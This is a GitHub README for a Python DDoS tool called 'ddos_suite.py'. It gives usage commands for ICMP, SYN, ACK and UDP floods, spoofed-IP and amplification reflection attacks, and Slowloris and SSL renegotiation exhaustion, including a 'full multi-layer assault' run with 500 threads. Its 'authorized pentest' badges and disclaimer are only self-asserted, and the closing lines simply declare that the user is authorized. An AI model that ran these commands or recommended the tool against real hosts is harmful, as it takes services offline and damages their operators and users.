# ⚡ DDOS — ATTACK ⚡
### *Multi-Layer Stress Testing Suite*

![Python](https://img.shields.io/badge/Python-3.7%2B-blue?style=for-the-badge&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-Powered-orange?style=for-the-badge)
![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)
![Authorized](https://img.shields.io/badge/Status-Authorized%20Pentest-brightgreen?style=for-the-badge)

---

**A comprehensive, multi-layer DDoS simulation tool for authorized penetration testing.**  
Covers **Layer 3 (Network)**, **Layer 4 (Transport)**, and **Layer 7 (Application)** attack vectors with a colorful real-time dashboard and live target status monitoring.

<br>

> ✅ **AUTHORIZED PENETRATION TEST** — This tool is used under explicit written authorization.

</div>

---

## 📋 Table of Contents

- [Features](#-features)
- [Requirements](#-requirements)
- [Quick Start](#-quick-start)
- [Usage](#-usage)
- [Attack Modules](#-attack-modules)
- [Dashboard](#-dashboard)
- [Author](#-author)
- [Disclaimer](#-disclaimer)

---

## 🚀 Features

| Layer | Attack Types | Description |
|:----:|:-----------|:------------|
| **🌐 L3 — Network** | ICMP flood, IP fragmentation, Spoofed IP | Raw packet floods at the network layer |
| **🔌 L4 — Transport** | SYN flood, SYN-ACK, ACK, UDP flood, UDP amp | TCP/UDP protocol-level exhaustion |
| **📡 L7 — Application** | HTTP flood, Slowloris, Slow POST, SSL reneg | Web server connection exhaustion |
| **📊 Dashboard** | Real-time colorful TUI | Live packet rates, target status, progress bars |
| **🔄 Multi-Layer** | Simultaneous L3+L4+L7 | Full-spectrum stress testing |
| **💓 Monitoring** | HTTP/TCP/DNS health checks | Automatic target status tracking |

---

## 📦 Requirements

- **Python** 3.7+
- **Scapy** — raw packet crafting library

### Installation

```bash
git clone https://github.com/Hacker00X1/ddos-attack.git
cd ddos-attack
```

# Install Python dependencies
pip install scapy
⚠️ Note: Layer 3 and Layer 4 attacks require root/administrator privileges for raw socket operations. Use sudo on Linux.

🎯 Quick Start
bash



# Basic HTTP flood (30 seconds, 100 threads)
python3 ddos_suite.py http://target.com

# Full multi-layer assault (60 seconds, 500 threads)
sudo python3 ddos_suite.py https://target.com -a full -d 60 -t 500

# List all available attack modules
python3 ddos_suite.py --list
📖 Usage



python3 ddos_suite.py <target> [options]
Arguments


Argument	Description
target	Target URL (e.g., http://example.com) or IP address (e.g., 192.168.1.100)
Options


Flag	Default	Description
-a, --attack	http_flood	Attack type — see Attack Modules
-d, --duration	30	Duration of the attack in seconds
-t, --threads	100	Number of concurrent worker threads
--port	80	Target port (required for IP targets)
--list	—	Display all available attack modules
Examples
🔹 Basic Single Attack
bash



# Default: HTTP flood, 30s, 100 threads
python3 ddos_suite.py http://target.com
🔹 Custom Attack with Options
bash



# SYN flood for 60 seconds using 200 threads
python3 ddos_suite.py http://target.com -a syn_flood -d 60 -t 200

# UDP flood against an IP target on port 443
sudo python3 ddos_suite.py 192.168.1.100 -a udp_flood -d 30 --port 443
🔹 Layer-Specific Assaults
bash



# Run ALL Layer 3 (Network) attacks simultaneously
sudo python3 ddos_suite.py http://target.com -a layer3 -d 30

# Run ALL Layer 4 (Transport) attacks simultaneously
sudo python3 ddos_suite.py http://target.com -a layer4 -d 60 -t 300

# Run ALL Layer 7 (Application) attacks simultaneously
python3 ddos_suite.py http://target.com -a layer7 -d 45
🔹 Full Multi-Layer Assault
bash



# ALL layers at once — the full arsenal
sudo python3 ddos_suite.py https://target.com -a full -d 60 -t 500
🔹 Sequential All Attacks
bash



# Run every attack one after another
python3 ddos_suite.py http://target.com -a all -d 20
🧠 Attack Modules
🌐 Layer 3 — Network Layer


Attack Name	Description
icmp_flood	ICMP echo request (ping) flood with spoofed sources
ip_frag	IP fragmentation flood — tiny fragments to exhaust reassembly
ip_spoof	Spoofed IP packet flood with random protocols
🔌 Layer 4 — Transport Layer


Attack Name	Description
syn_flood	TCP SYN flood — half-open connection exhaustion
syn_ack	TCP SYN-ACK flood —欺骗响应包
ack_flood	TCP ACK flood — bogus acknowledgment packets
udp_flood	UDP datagram flood with random payloads
udp_amp	UDP amplification simulation (DNS/NTP/SSDP/SNMP reflection)
📡 Layer 7 — Application Layer


Attack Name	Description
http_flood	HTTP GET/POST flood with randomized parameters
slowloris	Slowloris — partial HTTP headers, hold connections open
slow_post	Slow POST — trickle-slow request body transmission
ssl_reneg	SSL renegotiation flood — cryptographic handshake exhaustion
🎯 Special Modes


Mode	Description
layer3	Launches all 3 Layer 3 attacks simultaneously
layer4	Launches all 5 Layer 4 attacks simultaneously
layer7	Launches all 4 Layer 7 attacks simultaneously
all	Runs every single attack one after another (sequentially)
full	The big one — all L3 + L4 + L7 attacks at the same time
📊 Dashboard
The live dashboard provides real-time visibility into the attack:




┌─ TARGET INFORMATION ─────────────────────────────────────┐
│  URL:    http://target.com                                │
│  Host:   target.com                                       │
│  IP:     192.0.2.10                                       │
│  Port:   80                                               │
│  Attack: Multi-Layer Assault                              │
└────────────────────────────────────────────────────────────┘

┌─ TARGET STATUS ──────────────────────────────────────────┐
│  Status:   ●  ALIVE                                       │
│  HTTP:     ✓ 200 (45ms)                                   │
│  Ping:     ✓  0% loss                                     │
└────────────────────────────────────────────────────────────┘

┌─ ATTACK STATISTICS ──────────────────────────────────────┐
│  Packet Flow:  [████████████████████████████░░░░░░░░░░]   │
│  ▶ Sent:      1,234,567  packets                          │
│  ▶ Failed:    12         packets                          │
│  ▶ Rate:      41.2K      packets/s                        │
│  ▶ Success:   99.9%                                       │
└────────────────────────────────────────────────────────────┘

┌─ TIMING ─────────────────────────────────────────────────┐
│  Progress:  [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░] 45%  │
│  Elapsed:   27.0s                                         │
│  Remaining: 33.0s                                         │
└────────────────────────────────────────────────────────────┘

┌─ EVENTS ─────────────────────────────────────────────────┐
│  ✓ Flooding at 41.2K pkt/s                                │
└────────────────────────────────────────────────────────────┘
👨‍💻 Author
Hacker00X1

Authorized penetration testing professional.
This tool is developed for legitimate security assessments under explicit authorization.

⚖️ Disclaimer
This tool is provided for educational purposes and authorized security testing only.

You must have explicit written permission from the owner of any system you test.
Unauthorized use against systems you do not own or have permission to test is illegal.
The author assumes no liability for any misuse or damages caused by this tool.
Users are responsible for complying with all applicable local, state, and international laws.
You are authorized. You have permission. You know what you're doing.
Use it responsibly.
